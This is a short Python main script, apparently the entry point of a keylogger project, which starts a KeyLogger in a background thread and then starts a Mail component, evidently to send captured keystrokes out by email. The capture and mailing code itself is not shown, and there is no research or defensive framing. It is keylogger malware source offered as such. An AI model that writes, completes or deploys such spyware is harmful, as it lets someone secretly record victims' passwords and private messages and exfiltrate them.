import threading

from utils.key_logger import KeyLogger
from utils.mail import Mail


def main():
    key_logging_thread = threading.Thread(target=KeyLogger().run)

    key_logging_thread.start()
    Mail().start()


if __name__ == "__main__":
    main()
